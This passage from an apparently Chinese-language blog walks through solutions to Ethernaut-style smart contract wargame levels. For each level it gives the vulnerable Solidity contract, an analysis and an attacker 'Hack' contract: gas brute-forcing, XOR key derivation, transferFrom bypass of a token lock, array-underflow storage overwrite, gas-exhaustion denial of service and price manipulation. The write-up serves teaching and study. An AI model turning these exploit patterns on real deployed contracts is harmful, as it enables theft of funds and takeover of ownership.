&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>接着要使<code>locked</code>改变，只有调用<code>unlock</code>函数，提供一个<code>bytes16</code>的<code>_key</code>且与<code>_data</code>数组的第三个参数匹配。</p><p>简单回顾一下智能合约中状态变量是如何存储的：</p><p>在合约内部定义状态变量的顺序决定了变量存储在EVM中的字节值。每个slot能存储32字节的数据，在没存储满时允许不超过剩余存储字节的变量接着往后存储。不然开辟新的slot空间存储变量。</p><p>在本题中，首先定义了一个bool变量，占slot0的位置。接下来uint256的ID一共32字节因此在slot1的位置；接着是两个1字节和一个2字节的uint变量都位于slot2的位置，于是bytes32数组的存储位置便在slot3、slot4、slot5。</p><p>而unlock需要的参数便是数组的第三个参数即slot5存储的数据，我们直接用web3中提供的方法获取到便行。然后截取前16字节。</p><p><code>web3.eth.getStorageAt(&quot;youraddr&quot;,5)</code>然后<code>.slice(0,34)</code>因为前两位是0x，同是2字符表示1字节，<code>16*2+2=34</code>。</p><hr><h1 id="Gatekeeper-One"><a href="#Gatekeeper-One" class="headerlink" title="Gatekeeper One"></a>Gatekeeper One</h1><p>任务要求：成为entrant</p><p><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract GatekeeperOne &#123;<br><br>  address public entrant;<br><br>  modifier gateOne() &#123;<br>    require(msg.sender != tx.origin);<br>    _;<br>  &#125;<br><br>  modifier gateTwo() &#123;<br>    require(gasleft() % 8191 == 0);<br>    _;<br>  &#125;<br><br>  modifier gateThree(bytes8 _gateKey) &#123;<br>      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);<br>      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);<br>      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);<br>    _;<br>  &#125;<br><br>  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;<br>    entrant = tx.origin;<br>    return true;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>要成为entrant，我们只有调用<code>enter</code>方法且满足<code>gateOne</code>，<code>gateTwo</code>，<code>gateThree</code>三个修饰符。现在让我们逐步分析三个修饰符：</p><ul><li><code>gateOne</code>：要求调用者不是外部账户本身，因此，我们需要使用一个合约来调用Gatekeeper的<code>enter</code>函数。</li><li><code>gateTwo</code>：要求当前交易的剩余燃气量（gasleft()）必须是 8191 的倍数。</li><li><code>gateThree</code>：传入一个<code>bytes8</code>类型的<code>_gateKey</code>参数。<ul><li>第一个条件要求<code>_gateKey</code>的低 32 位等于其低 16 位。</li><li>第二个条件要求<code>_gateKey</code>的低 32 位不等于其低 64 位。</li><li>第三个条件要求<code>_gateKey</code>的低 32 位等于调用者的低 20 位。</li></ul></li></ul><p>遇到这种构造类题目，从最难的条件开始往前推更一目了然。例如对这道题的分析，第一个修饰符只要我们从另一个合约调用enter方法，因此至少想到攻击合约需要有<code>GatekeeperOne(target).enter(xxx)</code>这样的语句，</p><p>接着第二点需要gasleft()，这没有办法知道答案，只有靠暴力测试一个一个试。</p><p>第三点，满足三个子条件，对于数据转换较多的时候，进行类似因式分解的提取操作能使代码更简洁。这里我们把<code>uint64(_gateKey)</code>替换成一个k，满足条件就为：</p><ul><li>uint32(k) &#x3D;&#x3D; uint16(k)</li><li>uint32(k) !&#x3D; k</li><li>uint32(k) &#x3D;&#x3D; uint16(uint160(tx.origin))</li></ul><p>这样，我们只着重于构造一个满足上述式子的k值就大功告成了。</p><p>继续分析，从最难的开始：uint32(k) &#x3D;&#x3D; uint16(uint160(tx.origin))，只需要构造一个：<code>uint16 k16 = uint16(uint160(tx.origin))</code>就能满足</p><p>同时，这个k16的值恰好满足<code>uint32(k) == uint16(k)</code>，那我们接着进行第二点：uint32(k) !&#x3D; k，因为我们最后传入的值是bytes8，那么这里用uint64就合适了，如果k的值大于2^32-1，那么在进行<code>uint32</code>强制转换时，它的高位都将被截断，保留低32位，这时uint32(k)将会失去一部分值导致uint32(k) !&#x3D; k。于是最终的k为uint64 k &#x3D; uint64(1 &lt;&lt; 63) + uint64(k16)。再将其转换为一个bytes8类型的数就是我们需要的_gateKey。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Hack &#123;<br>  GatekeeperOne target;<br>  event Gas(uint num);<br><br>  constructor(address _target) &#123;<br>    target = GatekeeperOne(_target);<br>  &#125;<br><br>  function enter(bytes8 key, uint gas) external &#123;<br>    require(target.enter&#123;gas: 8191*10+gas&#125;(key));<br>  &#125;<br><br>  function Key() public view returns (bytes8) &#123;<br><br>    uint16 k16 = uint16(uint160(tx.origin));<br><br>    uint64 k64 = uint64(1 &lt;&lt; 63) + uint64(k16);<br><br>    bytes8 key = bytes8(k64);<br><br>    return key;<br>  &#125;<br><br>  function test(bytes8 key) public &#123;<br>    for (uint i = 100; i &lt; 8191; i++) <br>    &#123;<br>      try target.enter&#123;gas: 8191*10+i&#125;(this.Key())  &#123;<br>        emit Gas(i);<br>        return ;<br>      &#125; catch &#123;&#125;<br>    &#125;<br>    revert(&quot;all failed&quot;);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h1 id="Gatekeeper-Tow"><a href="#Gatekeeper-Tow" class="headerlink" title="Gatekeeper Tow"></a>Gatekeeper Tow</h1><p>任务要求：成为entrant</p><p><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract GatekeeperTwo &#123;<br><br>  address public entrant;<br><br>  modifier gateOne() &#123;<br>    require(msg.sender != tx.origin);<br>    _;<br>  &#125;<br><br>  modifier gateTwo() &#123;<br>    uint x;<br>    assembly &#123; x := extcodesize(caller()) &#125;<br>    require(x == 0);<br>    _;<br>  &#125;<br><br>  modifier gateThree(bytes8 _gateKey) &#123;<br>    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);<br>    _;<br>  &#125;<br><br>  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;<br>    entrant = tx.origin;<br>    return true;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>同上一个挑战是同一种类型，因此直接分析enter执行条件：</p><ul><li><code>gateOne</code>：要求使用合约调用。</li><li><code>gateTwo</code>：貌似要求msg.sender不是一个合约。</li><li><code>gateThree</code>：传入一个<code>bytes8</code>类型的<code>_gateKey</code>参数。</li></ul><p>直接分析，关于extcodesize()的部分可以看文章末尾，现在我们满足gateThree：<code>uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max)</code>，一个计算式都看着又臭又长，但是不要怕，我们直接定义变量进行简化。</p><p>首先对左边进行处理：<code>uint64 x = uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))</code>注意，这里的msg.sender应该是我们的合约，因此<strong>要用address(this)进行替换</strong>，uint64(_gateKey)便是我们传入的值，定义为key，于是简化为：</p><p><code>x ^ key == type(uint64).max</code>，这样一个异或运算，同时我们知道在异或运算中：<code>a ^ a ^ b = b</code></p><p>而我们又可以有：<code>x ^ x ^ key == key</code>，这里的<code>x ^ key又等于type(uint64).max</code>，由此可得<code>key = x ^ type(uint64).max</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Hack &#123;<br>  constructor(GatekeeperTwo target) &#123;<br>    uint64 s = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));<br>    <br>    uint64 k64 = s ^ type(uint64).max;<br>    <br>    bytes8 key = bytes8(k64);<br>    target.enter(key);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>extcodesize()</p></blockquote><hr><h1 id="NaughtCoin"><a href="#NaughtCoin" class="headerlink" title="NaughtCoin"></a>NaughtCoin</h1><p>任务要求：通过转移走合约中的所有余额。</p><p><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>import &#x27;openzeppelin-contracts-08/token/ERC20/ERC20.sol&#x27;;<br><br> contract NaughtCoin is ERC20 &#123;<br><br>  // string public constant name = &#x27;NaughtCoin&#x27;;<br>  // string public constant symbol = &#x27;0x0&#x27;;<br>  // uint public constant decimals = 18;<br>  uint public timeLock = block.timestamp + 10 * 365 days;<br>  uint256 public INITIAL_SUPPLY;<br>  address public player;<br><br>  constructor(address _player) <br>  ERC20(&#x27;NaughtCoin&#x27;, &#x27;0x0&#x27;) &#123;<br>    player = _player;<br>    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));<br>    // _totalSupply = INITIAL_SUPPLY;<br>    // _balances[player] = INITIAL_SUPPLY;<br>    _mint(player, INITIAL_SUPPLY);<br>    emit Transfer(address(0), player, INITIAL_SUPPLY);<br>  &#125;<br>  <br>  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;<br>    super.transfer(_to, _value);<br>  &#125;<br><br>  // Prevent the initial owner from transferring tokens until the timelock has passed<br>  modifier lockTokens() &#123;<br>    if (msg.sender == player) &#123;<br>      require(block.timestamp &gt; timeLock);<br>      _;<br>    &#125; else &#123;<br>     _;<br>    &#125;<br>  &#125; <br>&#125; <br></code></pre></td></tr></table></figure><p>整个合约中只有transfer()一个函数进行余额转移，同时这个函数受到lockTokens的限制只能在十年后才可以调用。因此我们只能通过其他手段，</p><p>合约导入了ERC20，所以对于代币的转移除了transfer还有transferfrom方法，只需要注意transfrom函数还需要额外的操作：approve。</p><p>整个过程就是：在生成实例后，通过调用ERC20的approve批准将代币转移到攻击合约或其他地方，然后进行transferfrom调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Hack &#123;<br><br>  function pwn(IERC20 coin) external &#123;<br>    address player = NaughtCoin(address(coin)).player();<br>    uint amount = coin.balanceOf(player);<br><br>    coin.transferFrom(player, address(this), amount);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h1 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h1><p>任务要求：拥有合约的所有权。</p><p><strong>源代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Preservation &#123;<br><br>  // public library contracts <br>  address public timeZone1Library;<br>  address public timeZone2Library;<br>  address public owner; <br>  uint storedTime;<br>  // Sets the function signature for delegatecall<br>  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));<br><br>  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) &#123;<br>    timeZone1Library = _timeZone1LibraryAddress; <br>    timeZone2Library = _timeZone2LibraryAddress; <br>    owner = msg.sender;<br>  &#125;<br> <br>  // set the time for timezone 1<br>  function setFirstTime(uint _timeStamp) public &#123;<br>    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));<br>  &#125;<br><br>  // set the time for timezone 2<br>  function setSecondTime(uint _timeStamp) public &#123;<br>    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));<br>  &#125;<br>&#125;<br><br>// Simple library contract to set the time<br>contract LibraryContract &#123;<br><br>  // stores a timestamp <br>  uint storedTime;  <br><br>  function setTime(uint _time) public &#123;<br>    storedTime = _time;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在合约中，只有在部署时初始化了owner状态，因此我们对于直接调用某个函数进行owner更新是没有办法的。</p><p>先不要慌，来看看合约中还干了些什么：</p><hr><h1 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h1><p>任务要求：从丢失的账户中找回代币。</p><p><strong>源代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Recovery &#123;<br><br>  //generate tokens<br>  function generateToken(string memory _name, uint256 _initialSupply) public &#123;<br>    new SimpleToken(_name, msg.sender, _initialSupply);<br>  <br>  &#125;<br>&#125;<br><br>contract SimpleToken &#123;<br><br>  string public name;<br>  mapping (address =&gt; uint) public balances;<br><br>  // constructor<br>  constructor(string memory _name, address _creator, uint256 _initialSupply) &#123;<br>    name = _name;<br>    balances[_creator] = _initialSupply;<br>  &#125;<br><br>  // collect ether in return for tokens<br>  receive() external payable &#123;<br>    balances[msg.sender] = msg.value * 10;<br>  &#125;<br><br>  // allow transfers of tokens<br>  function transfer(address _to, uint _amount) public &#123; <br>    require(balances[msg.sender] &gt;= _amount);<br>    balances[msg.sender] = balances[msg.sender] - _amount;<br>    balances[_to] = _amount;<br>  &#125;<br><br>  // clean up after ourselves<br>  function destroy(address payable _to) public &#123;<br>    selfdestruct(_to);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>根据题目大意，在通过Recovery部署的一个SimpToken合约地址丢失了，该合约还含有0.001eth。因此，我们要做的就是1、找回SimpleToken合约的地址。2、回收其0.001ether。</p><p>通过payable关键字可以查到SimpleToken合约中通过receive函数接受ether，同时通过destroy可以向外发送ether，因此只需要能够找到该合约地址并调用destroy方法，那么就能够通过挑战。</p><p>那么怎么获得一个地址呢？首先我们可以接助区块链浏览器查询，但这样的效率太低。因此我们使用另一种办法：构造地址</p><p><strong>以太坊生成地址的逻辑</strong>：</p><hr><h1 id="MagicNumber"><a href="#MagicNumber" class="headerlink" title="MagicNumber"></a>MagicNumber</h1><p>任务要求：构造一个合约，使其能够返回正确数字。</p><p><strong>源代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract MagicNum &#123;<br><br>  address public solver;<br><br>  constructor() &#123;&#125;<br><br>  function setSolver(address _solver) public &#123;<br>    solver = _solver;<br>  &#125;<br><br>  /*<br>    ____________/\\\_______/\\\\\\\\\_____        <br>     __________/\\\\\_____/\\\///////\\\___       <br>      ________/\\\/\\\____\///______\//\\\__      <br>       ______/\\\/\/\\\______________/\\\/___     <br>        ____/\\\/__\/\\\___________/\\\//_____    <br>         __/\\\\\\\\\\\\\\\\_____/\\\//________   <br>          _\///////////\\\//____/\\\/___________  <br>           ___________\/\\\_____/\\\\\\\\\\\\\\\_ <br>            ___________\///_____\///////////////__<br>  */<br>&#125;<br></code></pre></td></tr></table></figure><p>但题目中额外要求：要求不超过10opcodes，也就意味着我们不能通过常规的编写方法来完成这关。</p><p>需要通过字节码来创建一个简单的智能合约，而在这个网站我找到了需要的字节码：<img src="/2023/02/25/Ether/"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Hack &#123;<br>  constructor (MagicNum target) &#123;<br>    address addr;<br>    bytes memory bytecode = hex&quot;69602a60005260206000f3600052600a6016f3&quot;;<br><br>    assembly &#123;<br>      addr := create(0, add(bytecode, 0x20), 0x13)<br>    &#125;<br>    target.setSolver(addr);<br>  &#125; <br>&#125;<br></code></pre></td></tr></table></figure><hr><h1 id="Alice-Codex"><a href="#Alice-Codex" class="headerlink" title="Alice Codex"></a>Alice Codex</h1><p>任务要求：获得合约的所有权。</p><p><strong>源代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.5.0;<br><br>import &#x27;../helpers/Ownable-05.sol&#x27;;<br><br>contract AlienCodex is Ownable &#123;<br><br>  bool public contact;<br>  bytes32[] public codex;<br><br>  modifier contacted() &#123;<br>    assert(contact);<br>    _;<br>  &#125;<br>  <br>  function makeContact() public &#123;<br>    contact = true;<br>  &#125;<br><br>  function record(bytes32 _content) contacted public &#123;<br>    codex.push(_content);<br>  &#125;<br><br>  function retract() contacted public &#123;<br>    codex.length--;<br>  &#125;<br><br>  function revise(uint i, bytes32 _content) contacted public &#123;<br>    codex[i] = _content;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>合约继承ownable合约，这个合约的第一个状态变量就是address owner，因此我们要做的就是想办法override这个owner状态变量。</p><p>在codex为0的时候调用retract，将会产生下溢，导致数组的长度变为2**256-1。</p><p>我们再来分析一下storage中的存储状态，在调用retract之前，<code>slot0 - owner（20bytes），contact（1byte），slot1 - length codex</code></p><p>对于数组元素则是：<code>slot h = codex[0],h=keccak256(1)</code>，整个codex数组占了2**256个槽。</p><p>因此我们要做的就是找到一个索引i，使得<code>slot h+i =slot 0</code>，也即是i&#x3D;-h这样的一个值，然后通过调用revise函数进行覆盖。</p><p>通过调用makeContact()来使我们能够进行retract()、revise()操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Hack &#123;<br>  constructor(AlienCodex target) &#123;<br>    target.makeContact();<br>    target.retract();<br><br>    uint256 h = uint256(keccak256(abi.encode(uint256(1))));<br>    uint256 i;<br>    unchecked &#123;<br>      i -= h;<br>    &#125;<br>    target.revise(i, byte32(uint256(uint160(msg.sender))));<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h1 id="Denial"><a href="#Denial" class="headerlink" title="Denial"></a>Denial</h1><p>任务要求：拒绝owner进行提款。</p><p><strong>源代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br>contract Denial &#123;<br><br>    address public partner; // withdrawal partner - pay the gas, split the withdraw<br>    address public constant owner = address(0xA9E);<br>    uint timeLastWithdrawn;<br>    mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances<br><br>    function setWithdrawPartner(address _partner) public &#123;<br>        partner = _partner;<br>    &#125;<br><br>    // withdraw 1% to recipient and 1% to owner<br>    function withdraw() public &#123;<br>        uint amountToSend = address(this).balance / 100;<br>        // perform a call without checking return<br>        // The recipient can revert, the owner will still get their share<br>        partner.call&#123;value:amountToSend&#125;(&quot;&quot;);<br>        payable(owner).transfer(amountToSend);<br>        // keep track of last withdrawal time<br>        timeLastWithdrawn = block.timestamp;<br>        withdrawPartnerBalances[partner] +=  amountToSend;<br>    &#125;<br><br>    // allow deposit of funds<br>    receive() external payable &#123;&#125;<br><br>    // convenience function<br>    function contractBalance() public view returns (uint) &#123;<br>        return address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当有人调用withdraw函数时，会将一些资金发送回所有者，我们要做到就是在partner地址中能够使交易回退，就可以保证后续的代码无法执行。</p><p>仅仅通过revert()，我们无法拒绝提款，但可以通过消耗完gas，来拒绝交易进行。</p><p>在solidity0.8.0版本之前，我们可以通过assembly(false)来消耗完所有的gas，在此之后assembly(false)不会消耗完所有的gas了，但可以通过汇编中的invalid()达到相同的效果：<code>assembly&#123; invalid() &#125;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Hack &#123;<br>  constructor(Denial target) &#123;<br>    target.setWithdrawPartner(address(this));<br>  &#125;<br><br>  fallback() external payable &#123; <br>    assembly&#123;<br>      invalid()<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h1 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h1><p>任务要求：想办法薅。</p><p><strong>源代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>interface Buyer &#123;<br>  function price() external view returns (uint);<br>&#125;<br><br>contract Shop &#123;<br>  uint public price = 100;<br>  bool public isSold;<br><br>  function buy() public &#123;<br>    Buyer _buyer = Buyer(msg.sender);<br><br>    if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;<br>      isSold = true;<br>      price = _buyer.price();<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>因为合约对Buyer进行了两次price调用，那么我们可以在price函数中进行两次不同的操作，第一次正常大于价格，但在第二次调用时进行另一种逻辑，进行价格调整。</p><p>view函数不能编写任何状态变量，通过自身的isSold进行条件判断。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Hack &#123;<br>  Shop target;<br><br>  constructor(address _tar) &#123;<br>    target = Shop(_tar);<br>  &#125;<br>  function price() external view returns (uint) &#123;<br>    if (!target.isSold()) &#123;<br>      return 101;<br>    &#125; else &#123;<br>      return 0;<br>    &#125;<br>  